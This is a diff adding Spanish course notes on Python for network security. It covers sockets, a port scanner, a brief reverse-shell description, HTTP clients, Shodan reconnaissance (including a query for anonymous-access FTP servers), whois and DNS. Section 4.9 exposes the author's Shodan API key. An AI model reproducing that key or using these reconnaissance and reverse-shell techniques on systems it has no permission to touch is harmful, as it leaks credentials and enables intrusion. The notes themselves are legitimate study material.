@@ -1,0 +1,2200 @@
+
+                                *****************************           DOCUMENTACIÓN           *****************************
+
+
+Unidad 1 -> Trabajando con sockets en Python 
+
+    1.1 Breve introducción a los sockets: 
+
+        - Los sockets de red son una manera fácil de establecer una comunicación entre procesos que están en la misma máquina o en máquinas diferentes.
+        - Una dirección de socket de red consta de una dirección IP y un número de puerto. El objetivo de un socket es comunicar procesos a través de la red.
+        - Los programas utilizan sockets para comunicarse con otros programas, que pueden estar situados en computadoras distintas.
+
+        Los sockets los podemos clasificar en dos grandes categorías:
+
+            - Los de flujo, TCP     --> socket.SOCK_STREAM ( ES EL QUE VAMOS A USAR )
+            - Los de diagramas, UDP --> socket.SOCK_DGRAM
+
+
+    1.2 Creación de un socket:
+
+        Para crer un socket se usa el constructor socket.socket(), el cual puede tomar parámetros opcionales que son:
+            - Familia
+            - Tipo
+            - Protocolo
+
+        Por defecto se utiliza la familia AF_INET y el tipo SOCK_STREAM.
+
+        Asi se vería en Python --> s = socket.socket (socket_family, socket_type, protocol = 0)
+        
+        Los sockets también se pueden claseficar por la familia:
+
+            - Socket UNIX -> socket.AF_UNIX. Se crearon antes de la concepción de las redes y se basan en ficheros.
+            - Socket -> socket.AF_INET, el que nos interesa.
+            - Socket -> socket.AF_INET6 para IPv6.
+
+
+     1.3 Módulo socket en python:
+
+        Por defecto se instala cuando instalamos python, una manera de comprobarlo es la siguiente:
+        ( Esto desde el intérprete de python )
+            import socket
+            
+            dir(socket)   
+
+
+    1.4 Recopilación de información con sockets:
+
+        Los métodos útiles para recopilar más información son:
+
+            - socket.gethostbyname(hostname)          -> Obtenemos una direccion IP a partir de un nombre de dominio.
+            - socket.gethostbyaddr(ip_address)        -> Obtenemos un nombre de dominio a partir de una direccion IP.
+            - socket.gethostbyname_ex(hostname)       -> Obtenemos muchas direcciones IP a partir de un solo nombre de dominio
+            - socket.getservbyname (nombre_protocolo) -> Obtenemos el numero del puerto a partir del nombre del puerto.
+            - socket.getservbyport(puerto)            -> Obtenemos el nombre del puerto a partir del número del puerto.
+
+
+    1.5 Implementar en Python un escáner de puertos con sockets
+
+        De manera fácil podemos verificar si un puerto específico está abierto, cerrado o filtrado al llamar al método -> connect_ex().
+        El método -> socket.connect_ex(dirección,puerto) se usa para implementar el escaneo de puertos con sockets.
+
+
+    1.6 Implementar en Python un servidor HTTP
+
+        Métodos de socket del servidor:
+
+            - socket.bind(dirección) -> Este método nos permite conectar la dirección con el socket, 
+            con el requisito de que el socket debe estar abierto antes de establecer la conexión con la dirección.
+
+            - socket.listen(numero_conexiones) -> Este método acepta como parámetro el número máximo de conexiones de los clientes 
+            e inicia la escucha TCP para las conexiones entrantes.
+
+            - socket.accept() -> Este método nos permite aceptar conexiones del cliente. 
+            Este método devuelve dos valores: client_socket y la dirección del cliente. client_socket es un nuevo objeto de socket utilizado para enviar y recibir datos. 
+            Antes de usar este método, debe llamar a los métodos socket.bind(dirección) y socket.listen(numero_conexiones).
+
+        Implementación del servidor:
+
+            - Podemos usar el método bind() que acepta como parámetros la dirección IP y el puerto.
+            - Con listen() podemos establecer el número máximo de conexiones. Ej: mysocket.listen(5)
+            - La lógica del servidor, con acept() podemos aceptar las peticiones de los clientes, leer datos entrantes con recv() y responderemos con 
+            un HTML con el método send(). 
+
+***********************************************************************************************************************************************************************
+
+Unidad 2 -> Aplicaciones clientes-servidor con sockets en python
+
+    2.1 Métodos para enviar y recibir datos entre un cliente y un servidor
+
+        - socket.recv(buffer)             -> Con este método recibimos datos del socket. Su argumento indica la cantidad máxima de datos que puede recibir.
+        - socket.recvfrom(buffer)         -> Con este método recibimos datos y la dirección del remitente.
+        - socket.recv_into(buffer)        -> Con este método recibimos datos en un buffer. 
+        - socket.recvfrom_into(buffer)    -> Con este método recibimos datos en un buffer.
+        - socket.send(bytes)              -> Con este método enviamos datos de bytes al destino especificado.
+        - socket.sendto(datos, dirección) -> Con este método enviamos datos a una dirección determinada.
+        - socket.sendall(datos)           -> Con este método enviamos todos los datos en el buffer.
+        - socket.close()                  -> Con este método liberamos la memoria y finalizamos la conexión.
+
+            NOTA: El buffer es un espacio temporal de memoria física el cual se usa para almacenar información mientras se envía de un lado a otro.
+
+    2.2 Métodos de socket del servidor
+
+        - socket.bind(dirección)           -> Nos permite conectar la dirección con el socket con la condición de que el socket debe de estar ya abierto.
+        - socket.listen(numero_conexiones) -> Su parámetro indica el máximo número de conexiones cliente que se pueden aceptar. Su escucha es TCP.
+        - socket.accept()                  -> Nos permite aceptar las conexiones de los clientes. Devuelve 2 valores:
+            |
+            |-> client_socket -> Antes de ser usado debe haber llamado previamente a socket.bind(dirección) y socket.listen(numero_conexiones)
+            |-> Direccion del cliente.
+
+
+    2.3 Métodos de socket del cliente
+
+        - socket.connect(ip_address) -> Este método conecta al cliente a la dirección IP del servidor. Hace lo mismo que el método connect_ex() y también ofrece
+        la posibilidad de lanzar un error en caso de no poder conectar con el servidor.
+
+    
+    2.4 Administrar excepciones de socket
+
+        - exception socket.timeout  -> Este bloque captura excepciones relacionadas con el vencimiento de los tiempos de espera.
+        - exception socket.gaierror -> Este bloque detecta errores durante la búsqueda de información sobre direcciones IP. Ej: cuando usamos los métodos getaddrinfo() y getnameinfo().
+        - exception socket.error    -> Este bloque detecta errores genéricos de entrada y salida y comunicación.
+
+    2.5 Creando un cliente y un servidor TCP con sockets
+
+        - Servidor:
+            |
+            | -> Lo primero es crear el socket del servidor                    >> servidor = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+              Ahora hay que asignarle el puerto de escucha argunmento bind     >> socket_s.bind(("localhost", 9999))
+              Usamos un par de argumentos para escuchar y aceptar los clientes >> socket_s.listen(10) y socket_s.accept()
+              Para enviar y recibir datos del socket usamos recv() y send()    >> recibido = socket_cliente.recv(1024), print("Recibido: ", recibido) y socket_cliente.send(recibido)
+              Para finalizar cerramos el socket                                >> socket_s.close()
+
+
+        - Cliente:
+            |
+            | -> Es mucho mas sencillo que el servidor >> socket_cliente = socket.socket(), socket_cliente.connect(("localhost", 9999)) y socket_cliente.send("hola")
+
+
+    2.6 Shell inversa con sockets
+
+        - Una Shell inversa se trata de acción mediante la cual un usuario consigue acceder a la shell de un servidor externo.
+        - En este caso estamos utilizando dos nuevos módulos: os y subprocess.
+        - Necesitamos establecer la conexión con nuestro socket a través de la salida del comando. Esto lo logramos con la instrucción: os.dup2(sock.fileno())
+
+
+***********************************************************************************************************************************************************************
+
+    Unidad 3 -> Módulos para realizar peticiones con Python
+
+        3.1 Protocolo HTTP y creación de clientes HTTP en python
+
+            - HTTP es un protocolo de capa de aplicación que básicamente consta de dos elementos: una solicitud realizada por el cliente, 
+            que solicita al servidor un recurso específico especificado por una URL, y una respuesta, enviada por el servidor, que suministra el recurso que el cliente ha solicitado.
+            - El protocolo http es un protocolo de transferencia de datos de hyper-texto, sin estado que no almacena la información.
+            - Al ser un protocolo sin estado para poder almacenar información relativa a una transacción HTTP hay que recurrir a otras técnicas como cookies o sesiones.
+            - Los servidores devuelven un código HTTP que indica el resultado de una operación solicitada por el cliente.
+            - Se pueden utilizar cabeceras(headers) en las peticiones para incluir información extra tanto en peticiones como en respuestas.
+
+                Métodos:
+
+                    GET ->  Pide una representación del recurso especificado. 
+                        Por seguridad no debería ser usado por aplicaciones que causen efectos ya que transmite información a través de la URI agregando parámetros a la URL.
+
+                    HEAD -> Pide una respuesta idéntica a la que correspondería a una petición GET, pero en la petición no se devuelve el cuerpo. 
+                        Esto es útil para poder recuperar los metadatos de los encabezados de respuesta, sin tener que transportar todo el contenido.
+
+                    POST -> Envía los datos para que sean procesados por el recurso identificado. 
+                        Los datos se incluirán en el cuerpo de la petición. Esto puede resultar en la creación de un nuevo recurso o 
+                        de las actualizaciones de los recursos existentes o ambas cosas.
+
+
+            - Python proporciona una serie de módulos para crear un cliente HTTP. Los módulos que proporciona Python en la biblioteca estándar son httplib.client, urllib.request. 
+
+            - Una instancia de la clase -> HTTPConnection, representa una transacción con un servidor HTTP. Debe iniciarse pasando el host (obligatorio) y el puerto (opcional).
+            Si no se especifica el número de puerto, este será por defecto el 80.
+
+        
+        3.2 Construyendo un cliente HTTP con urllib.request
+
+            - urllib puede leer datos de una URL usando varios protocolos, como HTTP, HTTPS, FTP o Gopher.
+            - Este objeto tiene métodos como read(), readline(), readlines() y close(), que funcionan exactamente igual que en los objetos de archivo.
+            - Este objeto tiene métodos como read(), readline(), readlines() y close(), que funcionan exactamente igual que en los objetos de archivo.
+            - Podemos administrar errores del módulo urllib con el URLError y si trabajamos con HTTP con el HTTPError.
+            - Los estados de una respuesta nos da información sobre la respuesta. En la siguiente URL podemos saber mas sobre los estados:
+           
+            Estados -> https://www.iana.org/assignments/http-status-codes/http-status-codes.xhtml
+
+
+        3.3 Comprobación de cabeceras HTTP con urllib.request
+
+            - Las peticiones HTTP constan de dos partes principales: cabeceras y un cuerpo.
+            - La declaración http_response.headers proporciona las cabeceras de respuesta del servidor web.
+            - Es importante verificar si el código de respuesta es igual a 200, indicando que la respuesta es OK.
+        
+		
+        3.4 Personalización de cabeceras con urllib
+
+            - Usaremos User-Agent para personalizar nuestras cabeceras.
+            - Podríamos personalizar la cabeceras que se envían para recuperar una versión específica de un sitio web.
+			- User-Agent es un encabezado que se utiliza para identificar el navegador y el sistema operativo que estamos utilizando para realizar peticiones a un determinado dominio.
+			- Por defecto se identifica como -> "Python-urllib/version".
+			- Si queremos identificarnos, por ejemplo, como un navegador Chrome, reamos la misma solicitud GET 
+			utilizando la clase Request pasando como parámetro una cabecera de User-Agent HTTP personalizada.
+			
+			
+		3.5 Módulo urllib3
+		
+			- Permite externder las funcionalidades de urllib, permitiendo aprovechar las caracteristicas avanzadas del protocolo HTTP 1.1.
+			- La caracteristica mas importante es la de reutilizacion de conexiones TCP para realizar multiples peticiones y que
+			soporta la validación de certificados en conexiones HTTPS.
+			- Otra caracteristica interesante es que podemos indicar el numero conexiones que vamos a reservar en la pool, mediante la clase PoolManager.
+			- Para realizar este tipo de peticiones usamos el request del objeto pool. Este metodo acepta como parámetros (GET,POST) y la URL del dominio.
+			- La respuesta se obtiene en el objeto response, el cual si accedemos a su response.status, nos devolverá el estado de la peticion, ej: 200 OK.
+		
+		
+		3.6 Crear un cliente HTTP con requests
+			
+			- La mejor forma que tiene python para interactuar con un API REST es mediante una libreria de terceros requests: pip install requests
+			- Contamos con los métodos "POST", "GET", "PUT", "PATCH", "DELETE" que son todos los métodos disponibles para comunicarse con una API RESTful.
+			- El metodo request.get() devuelve un objeto response con toda la respuesta, podemos usar las siguientes funciones para obtener mas datos:
+				- response.status_code -> obtiene el código HTTP devuelto por el servidor.
+				- response.content 	   -> Contenido de la respuesta del servidor.
+				- response.json()      -> Serializa y devuelve una cadena con la estructura del JSON. En caso contrario devolvera una excepcion para cada respuesta.
+			- También podemos acceder a las propiedades de las cabeceras a través del objeto de respuesta donde podemos ver que el user-agent. 
+			
+
+		3.7 Obtener cabeceras con el módulo requests
+		
+			- Para ver las cabeceras de la respuesta y de la petición usamos el objeto response.
+			- La instruccion response.headers proporciona las cabeceras de la respuesta del servidor web. La respuesta al ser un diccionario de objetos, con el método items(),
+			podemos iterar y acceder a las diferentes cabeceras.
+			- De la misma manera podemos obtener solo las claves con el metodo keys().
+			- El modulo request facilita el uso de peticiones HTTP en python mejor que urllib.
+			
+			Ventajas del metodo requests:
+			
+				- Una biblioteca enfocada en la creación de clientes HTTP completamente funcionales.
+				- Soporta todos los métodos y características definidos en el protocolo HTTP.
+				- Es "Pythonic", es decir, está completamente escrito en Python y todas las operaciones se realizan de manera simple y con solo unas pocas líneas de código.
+				- Tareas como la integración con servicios web, la creación de un pool de conexiones HTTP, la codificación de datos POST en formularios y el manejo de cookies, se manejan automáticamente.
+				- Se trata de una librería que implementa las funcionalidades de urllib3 y las extiende.
+
+		3.8 Realizar peticiones GET a una API REST
+		
+			- Para probar a realizar peticiones con este módulo podríamos usar el servicio http://httpbin.org, ejecutando cada tipo de petición por separado.
+		
+		3.9 Realizar peticiones POST a una API REST
+		
+			- En las peticiones POST parte de la informacion la enviamos  a través del atributo de datos a través de una estructura de diccionario.
+			- Requiere un campo adicional "data" en el que enviamos el diccionario con todos los elementos que enviaremos al servidor.
+			- Podemos simular el envio de un formulario HTML como lo hacen los sitios web.
+			- Hay casos en los que se requiere que la solicitud contenga cabeceras que indiquen que nos estamos comunicando con el formato JSON.
+			- Podemos añadir nuestras propias cabeceras o modificar los existentes con el parámetro "headers".
+			- Otras de las acciones que podemos hacer con el método POST con el módulo requests es modificar las cabeceras (headers) de la petición enviando información adicional. 
+			- En la respuesta podemos ver que la cabecera que hemos definido se añade junto con las definidas por defecto.
+			
+			
+		3.10 Realizar peticiones mediante un proxy
+
+			- Una característica interesante que ofrece el módulo de requests es la posibilidad de realizar peticiones a través de un proxy entre nuestra red interna y la red externa.
+			- Se define de la siguiente manera -> proxy = {"protocol":"ip:port", ...}
+			- Para realizar una petición a través de un proxy, se utiliza el atributo proxies del método get: response = requests.get(url,headers=headers,proxies=proxy)
+			- El objeto proxy debe pasarse en forma de diccionario, es decir, especificamos el protocolo junto con la dirección IP y el puerto donde escucha el proxy:
+
+			import requests
+			http_proxy = "http://<direccion_ip>:<puerto>"
+			proxy_dictionary = { "http" : http_proxy}
+			requests.get("http://dominio.org", proxies=proxy_dictionary)
+			
+				
+		3.11 Gestionar excepciones con el módulo requests
+
+			- Los errores en el módulo requests se manejan de manera diferente a otros módulos.
+			- Para ver la excepción generada internamente, podemos usar el método raise_for_status().
+			- response = requests.get('http://url_not_exists')
+			requests.exceptions.ConnectionError: HTTPConnectionPool(host='url_not_exists', port=80): Max retries exceeded with url: 
+			/ (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f6ecaddd760>: Failed to establish a new connection: 
+			[Errno -2] Name or service not known'))
+
+
+			RESUMEN
+
+				En esta unidad hemos aprendido:
+
+					- Establecer la conexión con un host con módulo http.client utilizando la clase http.client.HTTPConnection.
+					- Establecer la conexión con un host con módulo urllib.request utilizando el método urlopen(), incluyendo la obtención del código de estado, 
+					cabeceras de la respuesta y de la petición a partir el objeto de respuesta response.
+					- Obtener información de las cabeceras de la respuesta y de la petición de diferentes formas como utilizando los métodos info() y getheaders().
+					- Personalizar las cabeceras que se envían en la petición a través del parámetro headers urllib.request.Request(url,headers=headers).
+					- Extraer información de una página web como enlaces e imágenes utilizando el módulo re para expresiones regulares.
+					- Establecer la conexión con un host con módulo urllib3 utilizando la clase PoolManager.
+					- Establecer la conexión con un dominio con módulo requests utilizando el método get(), 
+					incluyendo la obtención del código de estado, cabeceras de la respuesta y de la petición con el objeto de respuesta.
+					- Realizar una petición a una API Rest utilizando el módulo request a través de los métodos get() y post().
+
+
+***********************************************************************************************************************************************************************
+
+
+	Unidad 4 -> Recolección de información de servidores con Python
+
+		
+		4.1 Utilizando Shodan para la obtención de información de un servidor
+
+			- Shodan es un motor de búsqueda que se encarga de rastrear servidores y diversos tipos de dispositivos en Internet.
+			- Shodan es un proyecto que escanea el direccionamiento público de internet en más de 200 puertos y si encuentra puertos abiertos, 
+			guarda la respuesta (banner) que dan estas ips por estos puertos.
+			- Esta información es accesible vía web, línea de comando, API o por lenguajes de programación.
+			- La principal diferencia con respecto a otros buscadores es recorre internet escaneando cada dirección IP, obteniendo los servicios en ejecución y los puertos que tiene abiertos.
+			- Por ejemplo si queremos buscar servidores DNS podríamos realizar la búsqueda por el puerto 53: port:53
+			- Plugin de shodan para chrome: https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap?utm_source=chrome-ntp-icon
+		
+
+		4.2 Filtros en Shodan
+
+			- Estos filtros nos pueden ayudar a realizar una búsqueda con más detalle valiéndose para ello de los metadatos que los dispositivos o servicios otorgan.
+			- Su potencial real viene con las consultas personalizadas:
+				- after/before -> filtra los resultados por fecha.
+				- country 	   -> filtra los resultados por código de país de 2 dígitos.
+				- city 		   -> filtra los resultados por ciudad.
+				- geo 		   -> filtra los resultados por latitud/longitud.
+				- hostname     -> filtra los resultados por host o nombre de dominio.
+				- net 		   -> filtra los resultados por un rango específico de ips o un segmento de red.
+				- os 		   -> realiza la búsqueda para un determinado Sistema operativo.
+				- port 		   -> permite filtrar por número de puerto.
+			- Ejemplos:
+				- Servidores apache de Londres -> apache city:"London"
+				- Servidores ssh de uk         -> ssh country:uk
+
+	
+		4.3 Servicios de Shodan
+
+			- Servicio de mapas 				  -> Shodan dispone de un dashboard https://exposure.shodan.io donde podemos ver un resumen de los puertos y servicios expuestos para un país concreto.
+			- HoneyScore 						  -> https://honeyscore.shodan.io/ permite comprobar si una determinada dirección IP es un honeypot.
+			- Shodan CLI "Command Line Interface" -> https://cli.shodan.io proporciona una manera de realizar búsquedas en Shodan desde línea de comandos. Se necesita iniciar el programa con la API key.
+			- Servicios de exploits 			  -> Shodan ofrece buscar exploits desde distintas bases de datos de vulnerabilidades. https://exploits.shodan.io/welcome
+			- Servicio de imágenes 				  -> Proporcionar un contexto más amplio en torno a los resultados. Muestran que pantallas de inicio de sesion están disponibles.
+			- Shodan monitor 					  -> Herramienta diseñada para permitir a los usuarios llevar un seguimiento directo y sencillo de sus dispositivos. Recibiendo recomendaciones de seguridad 
+			y notificaciones en tiempo real cuando uno de sus dispositivos se exponga en la red. https://monitor.shodan.io/
+			- Hay que recalcar que Shodan recoge la información que le devuelve la máquina, y nada le impide a esa máquina falsear esta información.
+			- La información que nos da Shodan la usaremos como primera búsqueda que después tendremos que verificar.
+
+		4.4 Shodan API REST
+
+			- API REST de shodan -> https://developer.shodan.io/api
+			- Podemos usar los endpoint que aparecen en la documentación y concatenando como parámetros el API KEY y la consulta a realizar.
+			- Quedaría así -> https://api.shodan.io/shodan/host/search?key={YOUR_API_KEY}&query={query}
+			- Para realizar las peticiones correctamente es necesario indicarle el API_KEY que hemos obtenido cuando nos hemos registrado.
+			- Ejemplo de búsqueda con la cadena apache -> https://api.shodan.io/shodan/host/search?key=<API_KEY>&query=apache
+			- Una posible salida en formato JSOn podria ser la siguiente:
+
+				{'region_code': None,
+				'ip': 134744072, 
+				'postal_code': None, 
+				'country_code': 'US', 
+				'city': None, 
+				'dma_code': None, 
+				'last_update': '2020-06-09T14:42:14.527189', 
+				'latitude': 37.751, 
+				'tags': [], 
+				'area_code': None, 
+				'country_name': 'United States', 
+				'hostnames': ['dns.google'], 
+				'org': 'Google', 
+				'data': [], 
+				'asn': 'AS15169', 
+				'isp': 'Google', 
+				'longitude': -97.822, 
+				'country_code3': None, 
+				'domains': ['dns.google'], 
+				'ip_str': '8.8.8.8', 
+				'os': None, 
+				'ports': [53]}
+		
+
+		4.5 Acceso a Shodan desde Python
+
+			- La librería oficial de shodan en lenguaje python está disponible en el repositorio de Github: https://github.com/achillean/shodan-python
+			- Para instalar el módulo de Python lo podemos hacer con el comando: pip install shodan
+			- Para inicializar la herramienta es necesario indicarle el API KEY con el comando: shodan init <API_key&gt;
+			- Comandos:
+				- shodan host   -> permite visualizar información sobre un host, conocer su geolocalización, puertos que están abiertos, y qué organización es propietaria de esa dirección IP.
+				- shodan search -> permite realizar una búsqueda en Shodan y visualizar los resultados en la terminal de manera amigable.
+			- Por defecto muestra la dirección IP, puerto, nombres del host y otros datos.
+			- Se puede utilizar el parámetro "--fields" para imprimir campos de banners en los cuales se está interesado. Ej: shodan search --fields ip_str,port,org,hostnames apache tomcat
+
+
+		4.6 Shodanploit
+
+			- Esta herramienta se trata de un script en python que contiene todas las llamadas a la API de shodan desde línea de comandos. https://github.com/shodansploit/shodansploit
+			- Con esta herramienta se puede tener todas las llamadas que hacemos a Shodan desde la terminal, lo unico añadir el API_KEY al iniciar el Script.
+			- Podemos crearnos nuestra propia clase para buscar por shodan que tenga como métodos el __init__  para inicializar el objeto de Shodan a partir de la API_ KEY.
+			- shodan.host() devuelve una búsqueda en modo diccionario la cual podemos recorrer con el metodo items() clave ---> valor
+
+			- Entre las propiedades que devuelve la llamada destacar:
+				- data -> una lista de banners que proporcionan detalles sobre los servicios que tenían un puerto abierto en dicho servidor.
+				- port -> una lista de puertos abiertos para la dirección ip proporcionada.
+				- tags -> Shodan hace validación extra para algunos servicios/dispositivos y tiene etiquetas especiales para facilitar la identificación de ciertos tipos de dispositivos. 
+					Ej: La etiqueta "ics" para identificar sistemas de control industrial. 
+
+
+		4.7 Utilizando Shodan para la obtención de información de un servidor FTP
+
+			- Shodan permite realizar una búsqueda de servidores que tengan un acceso FTP con usuario anónimo y se pueda acceder sin usuario y password.
+			- Búsqueda con la cadena -> "port: 21 Anonymous user logged in" obtenemos aquellos servidores ftp que son vulnerables por permitir el acceso anónimo.
+		
+
+		4.8 Shodan eye
+
+			- Esta herramienta recopila toda la información sobre todos los dispositivos que están directamente conectados a Internet con las palabras clave especificadas.
+			- URL de instalacion github -> https://github.com/BullsEye0/shodan-eye
+			- O tambien: 
+				 pip3 install shodan
+				 git clone https://github.com/BullsEye0/shodan-eye shodaneye
+				 cd shodaneye
+				 python3 shodan-eye.py
+
+
+
+		4.9 Consultas sin API Key (Mi API_KEY -> ydysiK0Jt21OntYOiUuR317dXHB5uI4v)
+	
+			- Hay que comentar que Shodan a partir de cierto límite de resultados para exportarlos hay que pagar.
+			- https://github.com/owlonex/Shodanfy.py Script para hacer peticiones sin necesidad de utilizar el API KEY.
+
+			IMPORTANTE -> El script utiliza técnicas de scraping para obtener la información aunque tiene el peligro que nos pueden banear la dirección ip. 
+			En el caso de querer probar el script recomiendo hacerlo conectado a través de un proxy o vpn con ip dinámica.
+
+
+		4.10 Utilizando el registro Whois para obtener información de un servidor
+
+			- El protocolo Whois que es el nombre del protocolo que se utiliza para preguntar a los servidores operados por registros regionales de internet 
+			y contienen información sobre cada recurso (dirección IP o nombre de dominio) registrado en internet.
+			- Podemos utilizar el protocolo WHOIS para ver quién es el propietario registrado del nombre de dominio.
+			- Permite obtener información sobre el dominio o sobre la dirección IP.
+			- La información devuelta incluye direcciones físicas, direcciones de correo electrónico, nombres y números de teléfono. 
+			También se muestran los servidores de nombres DNS de un dominio.
+			- Las consultas de whois pueden devolver información de historial de IP, fechas de caducidad del dominio e incluso números de teléfono.
+			- Servicios de registro de dominios para obtener el detalle:
+				- Whois lookup Hacktarget -> https://hackertarget.com/whois-lookup/
+				- Whois lookup API        -> https://whois.domaintools.com/
+			- Entre los principales casos de uso para una búsqueda Whois podemos destacar:
+
+				    - Respuesta a incidentes e inteligencia de amenazas: 
+						Las ventajas de una búsqueda whois para aquellos que responden a un incidente de seguridad es identificar el ISP (proveedor de servicios de internet) 
+						que posee una dirección IP particular. A partir de esta información, 
+						se puede contactar al propietario del dominio y avisar al proveedor de la presencia de cierto tráfico anómalo.
+
+					- Registros históricos de Whois que permiten que un analista busque detalles en los datos: 
+						Por ejemplo, se pueden buscar datos de whois para encontrar una dirección de correo electrónico 
+						en varios dominios y determinar cuándo apareció por primera vez la dirección de correo electrónico en un determinado registro.
+
+					- Solución de problemas de red con Whois: 
+						Especialistas de seguridad de redes que investigan una ruta a través de Internet puede ver si una red en particular está introduciendo una latencia significativa. 
+						Mediante una búsqueda en de un registro de whois, se puede determinar quién es el propietario de la red en cuestión y ponerse en contacto con los responsables de esa red.
+
+			- Documentacion domaintools.com -> https://www.domaintools.com/resources/api-documentation
+
+
+		4.11 Módulo python-whois
+
+			- Hay un módulo de Python llamado python-whois para este protocolo, cuya documentación podemos encontrar en los siguientes enlaces:
+				- Repositorio GitHub  -> https://github.com/richardpenman/whois
+				- Modulo python-whois -> https://pypi.org/project/python-whois/
+
+			- Si queremos consultar los servidores de nombres y el propietario de un determinado dominio lo podemos hacer con el modulo whois():
+
+					         import whois
+							 dominio = "www.python.org"
+						     whois = whois.whois(dominio) # Esto devuelve una estructura tipo diccionario --> clave >>> valor
+						     for key in whois.keys(): # Usamos la estructura for para recorrer el diccionario y mostrar sus claves.
+						        print ("%s : %s \n" %(key, whois[key])
+
+
+		4.12 Módulo ipwhois
+
+			- Otro de los módulos que podemos usar para obtener esta información es el módulo llamado ipwhois para este protocolo.
+				- Documentacion ip Whois -> https://ipwhois.readthedocs.io/en/latest/index.html Instalacion -> pip install ipwhois
+
+			- Si queremos consultar la informacion de un determinado dominio lo que tenemos que hacer es convertir el dominio en ip y luego realizar la consulta con lookup_whois().
+
+
+		4.13 Extracción de información de servidores DNS
+
+			- DNS son las siglas de Domain Name Server, servicio de nombres de dominio utilizado para relacionar direcciones IP con nombres de dominio.
+			-  DNS se utiliza para distintos propósitos. Los más comunes son:
+				- Se emplea para asignar un rango de ips a un único dominio.
+				- Resolución de nombres 		     ->  Dado el nombre completo de un host, obtener su dirección IP.
+				- Resolución inversa de direcciones  -> Es el mecanismo inverso al anterior. Consiste en, dada una dirección IP, obtener el nombre de host asociado a la misma.
+				- Resolución de servidores de correo -> Dado un nombre de dominio (por ejemplo gmail.com) obtener el servidor a través del cual debe realizarse la 
+				entrega del correo electrónico (por ejemplo, gmail-smtp-in.l.google.com).
+
+
+			- DNS también es un protocolo que los dispositivos usan para consultar a los servidores DNS con el objetivo de resolver nombres de host en direcciones IP.
+			- La herramienta nslookup viene con la mayoría de los sistemas Linux y Windows y nos permite realizar consultas DNS desde la línea de comandos.
+			- Ejemplo: 
+
+			   $ nslookup python.org
+
+					Server:         192.168.18.1
+					Address:        192.168.18.1#53
+
+					Non-authoritative answer:
+					Name:   python.org
+					Address: 45.55.99.72
+
+
+			- Servidores DNS:
+
+				- Los servidores DNS permiten la consulta de diferentes tipos de registros en los que se incluyen servidores de correo, direcciones IP, nombres de dominios y otros servicios.
+				- Algunos de los registros más utilizados son:
+					A    -->Permite consultar la dirección IPv4
+					AAAA -->Permite consultar la dirección IPv6
+					MX   -->Permite consultar los servidores de correo
+					NS   -->Permite consultar el nombre del servidor (Name Server)
+					TXT  -->Permite consultar información en formato texto
+
+
+		4.14 Módulo DNSPython
+
+			- Python dispone del módulo dnspython que permite realizar operaciones de consulta de registros contra servidores DNS.
+			- Documentacion DNS Python 		 -> https://www.dnspython.org/
+			- Respositorio GitHub DNS Python -> https://github.com/rthalley/dnspython
+
+			- Este módulo permite: (Instalacion -> pip install dnspython) Sus paquetes necesarios son -> import dns y dns.resolver
+				- Acceso a alto nivel por medio de consultas a registros DNS.
+				- Acceso a bajo nivel permitiendo la manipulación directa de zonas, mensajes, nombres y registros.
+
+			- La información que podemos obtener de un determinado dominio es:
+				- Registros para servidores de correo -> ansMX = dns.resolver.query("dominio","MX")
+				- Registros para servidores de nombre -> ansNS = dns.resolver.query("dominio","NS")
+				- Registros para direcciones IPV4     -> ansA = dns.resolver.query("dominio","A")
+				- Registros para direcciones IPV6     -> ansAAAA = dns.resolver.query("dominio","AAAA")
+
+			- En este ejemplo, estamos haciendo una consulta con respecto a la dirección IPv4 de del dominio python.org con el submódulo dns.resolver:
+
+					import dns.resolver
+
+					respuestas = dns.resolver.query('python.org', 'A')
+					for respuesta in respuestas:
+						print('IP', respuesta.to_text())
+
+			- Ejemplos de DNS python -> https://www.dnspython.org/examples.html
+
+
+		4.14.1 Otras operaciones con el módulo dnspython
+
+			- Con el módulo dnspython podemos comprobar si un dominio es subdominio de otro a través del método is_subdomain():
+
+				  import dns.resolver
+
+				  dominio1 = dns.name.from_text('dominio1')
+				  dominio2 = dns.name.from_text('dominio2')
+				  dominio1.is_subdomain(dominio2)
+
+
+			- Si desea realizar una búsqueda inversa, debe usar el submódulo dns.reversename, como se muestra en el siguiente ejemplo:
+
+				 import dns.reversename
+
+				 name = dns.reversename.from_address("ip_address")
+				 print(dns.reversename.to_address(name))
+
+
+		4.15 Servicios DNS
+
+			- Robtex se trata de un servicio considerado la navaja suiza de internet.
+			- Permite obtener, sin dejar rastro alguno en el objetivo, consultas sobre los dominios, subdominios, servidores DNS.
+			- Este tipo de consultas suelen categorizarse como footprinting activo, aunque, al realizarlo a través de este servicio, en realidad se lleva a cabo de manera pasiva.
+			- Disponemos también de una API que devuelve los datos de geolocalización y de red de una dirección ip
+			- Servicio DNS de Robtex -> https://www.robtex.com/dns-lookup/
+			- Tipo de informacion que proporciona Robtex:
+				- Búsqueda de DNS inversa 									      -> Permite buscar un número de IP para averiguar qué nombres de host lo apuntan. Funciona para DNS, MX y NS
+				- Buscar un número de IP y obtener qué nombres de host lo apuntan -> Esto funciona para DNS, MX y NS
+				- Información Whois 											  ->  Permite realizar búsquedas para un dominio registrado en varias bases de datos de whois. 
+				Principales datos: propietario del dominio, la dirección ip, direcciones de correo, fechas de creación y actualización de dominios.
+
+
+
+		4.16 DNSLookup
+
+			- Está disponible en muchos sistemas operativos, incluidos Windows y la mayoría de las distribuciones de Linux.
+			- La herramienta Dig, es mas completa que nslookup.
+			- Los siguientes servicios web permiten hacer una consulta dns-lookup:
+				- Servicio DNS de hacker target -> https://hackertarget.com/dns-lookup
+				
+
+
+			RESUMEN:
+
+			 - Utilizar Shodan para la obtención de información de un servidor así como los filtros que podemos usar para realizar consultas avanzadas.
+
+			 - Obtener nuestra API KEY y usar los principales servicios de shodan para realizar búsquedas específicas.
+
+			 - Utilizar Python para realizar búsquedas en Shodan tanto a través de la API REST que proporciona como de forma programática utilizando el módulo de shodan en python. En el caso del acceso programático hemos aprendido a utilizar el método shodan.search() para realizar búsquedas por una determinada cadena.
+
+			 - Utilizar el cliente de shodan desde linea de comandos.
+
+			 - Crear nuestro script ShodanSearch con el objetivo de realizar búsquedas por dirección ip utilizando el método host() y por cadena de búsqueda utilizando el método search().
+
+			 - Realizar búsquedas en Shodan para obtener servidores FTP que permiten el acceso anónimo a partir de la cadena de búsqueda "port: 21 Anonymous user logged in".
+
+			 - Utilizar el comando whois y el módulo Python-whois para obtener información de un servidor con el método whois.whois(dominio).
+
